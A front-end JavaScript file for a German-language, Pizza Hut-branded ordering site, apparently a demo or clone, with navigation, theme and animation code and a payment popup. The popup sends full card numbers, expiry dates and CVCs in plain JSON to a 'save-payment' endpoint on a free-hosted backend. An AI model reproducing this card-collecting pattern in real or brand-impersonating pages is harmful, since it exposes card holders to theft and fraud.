const serverUrl = 'https://pizzahut-back.onrender.com';
// const serverUrl = 'http://localhost:3000';

/*~~~~~~~~~~~~~~~ MENU CONTROL ~~~~~~~~~~~~~~~*/
const navMenu = document.getElementById("nav-menu");
const navToggle = document.getElementById("nav-toggle");
const navClose = document.getElementById("nav-close");
const navLink = document.querySelectorAll(".nav__link");

if (navToggle) {
    navToggle.addEventListener('click', () => {
        navMenu.classList.add('show-menu')
    });
}

if (navClose) {
    navClose.addEventListener('click', () => {
        navMenu.classList.remove("show-menu")
    });
}

navLink.forEach(link => link.addEventListener('click', () => {
    navMenu.classList.remove("show-menu")
}));

/*~~~~~~~~~~~~~~~ CHANGE HEADER ON SCROLL ~~~~~~~~~~~~~~~*/
const scrollHeader = () => {
    const header = document.getElementById("header");
    this.scrollY >= 50
        ? header.classList.add("bg-header")
        : header.classList.remove("bg-header");
};
window.addEventListener("scroll", scrollHeader);

/*~~~~~~~~~~~~~~~ ACTIVE NAV LINK ~~~~~~~~~~~~~~~*/
const activeLink = () => {
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll(".nav__link");
    let current = "home";

    sections.forEach(section => {
        const sectionTop = section.offsetTop;
        if (this.scrollY >= sectionTop - 60) {
            current = section.getAttribute('id');
        }
    });

    navLinks.forEach(item => {
        item.classList.remove('active-link');
        if (item.href.includes(current)) {
            item.classList.add("active-link")
        }
    });
};
window.addEventListener("scroll", activeLink);

/*~~~~~~~~~~~~~~~ SCROLL UP BUTTON ~~~~~~~~~~~~~~~*/
const scrollUp = () => {
    const scrollUp = document.getElementById("scroll-up");
    this.scrollY >= 350
        ? scrollUp.classList.add("show-scroll")
        : scrollUp.classList.remove("show-scroll");
};
window.addEventListener("scroll", scrollUp);

/*~~~~~~~~~~~~~~~ DARK/LIGHT THEME ~~~~~~~~~~~~~~~*/
const themeButton = document.getElementById('theme-button');

if (localStorage.getItem('mode') == 'dark') {
    darkmode();
} else {
    lightmode();
}

themeButton.addEventListener('click', () => {
    if (localStorage.getItem('mode') == 'light') {
        darkmode();
    } else {
        lightmode();
    }
});

function darkmode() {
    document.body.classList.add('dark-theme');
    themeButton.classList.replace('fa-moon', 'fa-sun');
    localStorage.setItem('mode', 'dark');
}

function lightmode() {
    document.body.classList.remove('dark-theme');
    themeButton.classList.replace('fa-sun', 'fa-moon');
    localStorage.setItem('mode', 'light');
}

/*~~~~~~~~~~~~~~~ SCROLL REVEAL ANIMATION ~~~~~~~~~~~~~~~*/
const sr = ScrollReveal({
    origin: 'top',
    distance: '60px',
    duration: 2500,
    delay: 400,
});

sr.reveal('.home__img');
sr.reveal(".home__data", { origin: 'bottom' });
sr.reveal(".about__data", { origin: "left" });
sr.reveal(".about__img", { origin: "right" });
sr.reveal(".popular__card", { interval: 100 });
sr.reveal('.recently__data', { origin: "left" });
sr.reveal(".recently__img", { origin: 'right' });
sr.reveal('.newsletter');
sr.reveal('.footer');

/*~~~~~~~~~~~~~~~ PAYMENT POPUP ~~~~~~~~~~~~~~~*/
const popup = document.getElementById('payment-popup');
const closeBtn = document.querySelector('.close-btn');
const paymentForm = document.getElementById('payment-form');

const addressInput = paymentForm.querySelector('input[placeholder="Lieferadresse (mit PLZ & Stadt)"]');
const nameInput = paymentForm.querySelector('input[placeholder="Name auf der Karte"]');
const cardInput = paymentForm.querySelector('input[placeholder="Kartennummer"]');
const expiryInput = paymentForm.querySelector('input[placeholder="Ablaufdatum (MM/YY)"]');
const cvvInput = paymentForm.querySelector('input[placeholder="CVC"]');

document.querySelectorAll('.order-now-btn').forEach(button => {
    button.addEventListener('click', (e) => {
        e.preventDefault();
        popup.classList.add('show');
        setTimeout(() => {
            popup.classList.add('active');
        }, 10);
    });
});

function closePopupSmoothly() {
    popup.classList.remove('active');
    setTimeout(() => {
        popup.classList.remove('show');
    }, 400);
}

closeBtn.addEventListener('click', closePopupSmoothly);
window.addEventListener('click', (e) => {
    if (e.target === popup) {
        closePopupSmoothly();
    }
});

addressInput.addEventListener('input', () => {
    if (addressInput.value.trim().length >= 5) {
        clearError(addressInput);
    }
});

nameInput.addEventListener('input', () => {
    if (/^[A-Za-z\s]{2,}$/.test(nameInput.value.trim())) {
        clearError(nameInput);
    }
});

cardInput.addEventListener('input', () => {
    let value = cardInput.value.replace(/\D/g, '').slice(0, 16);
    value = value.replace(/(.{4})/g, '$1 ').trim();
    cardInput.value = value;
    if (/^\d{16}$/.test(value.replace(/\s+/g, ''))) {
        clearError(cardInput);
    }
});

expiryInput.addEventListener('input', () => {
    let value = expiryInput.value.replace(/\D/g, '').slice(0, 4);
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    expiryInput.value = value;
    if (/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) {
        clearError(expiryInput);
    }
});

cvvInput.addEventListener('input', () => {
    let value = cvvInput.value.replace(/\D/g, '').slice(0, 4);
    cvvInput.value = value;
    if (/^\d{3,4}$/.test(value)) {
        clearError(cvvInput);
    }
});

paymentForm.addEventListener('submit', (e) => {
    e.preventDefault();
    clearErrors();

    let hasError = false;

    const address = addressInput.value.trim();
    const cardholderName = nameInput.value.trim();
    const cardNumber = cardInput.value.replace(/\s+/g, '');
    const expiry = expiryInput.value.trim();
    const cvv = cvvInput.value.trim();

    if (address === '') {
        showError(addressInput, 'Bitte geben Sie eine Lieferadresse ein.');
        hasError = true;
    }

    if (!/^[A-Za-z\s]{2,}$/.test(cardholderName)) {
        showError(nameInput, 'Bitte geben Sie den Namen des Karteninhabers ein.');
        hasError = true;
    }

    if (!/^\d{16}$/.test(cardNumber)) {
        showError(cardInput, 'Geben Sie eine 16-stellige Kartennummer ein.');
        hasError = true;
    }

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
        showError(expiryInput, 'Verwenden Sie das Format MM/YY.');
        hasError = true;
    } else {
        const [month, year] = expiry.split('/').map(Number);
        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
        if (year < currentYear || (year === currentYear && month < currentMonth)) {
            showError(expiryInput, 'Die Karte ist abgelaufen.');
            hasError = true;
        }
    }

    if (!/^\d{3,4}$/.test(cvv)) {
        showError(cvvInput, 'Geben Sie eine 3- oder 4-stellige CVC ein.');
        hasError = true;
    }

    if (!hasError) {
        const payload = {
            address,
            cardholderName,
            cardNumber,
            expiry,
            cvv
        };

        fetch(`${serverUrl}/save-payment`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
            .then(res => res.json())
            .then(data => {
                console.log('Server response:', data);
                showSuccessMessage('Zahlung erfolgreich gespeichert (Demo)');
                paymentForm.reset();
                closePopupSmoothly();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Fehler beim Speichern der Daten');
            });
    }
});


function showError(input, message) {
    let error = input.nextElementSibling;
    if (!error || !error.classList.contains('error-message')) {
        error = document.createElement('div');
        error.className = 'error-message';
        input.parentNode.insertBefore(error, input.nextSibling);
    }
    error.textContent = message;
    input.classList.add('input-error');
}

function clearError(input) {
    const error = input.nextElementSibling;
    if (error && error.classList.contains('error-message')) {
        error.remove();
    }
    input.classList.remove('input-error');
}

function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove());
    document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
}

function showSuccessMessage(msg) {
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.textContent = msg;
    paymentForm.appendChild(successDiv);
    setTimeout(() => successDiv.remove(), 3000);
}
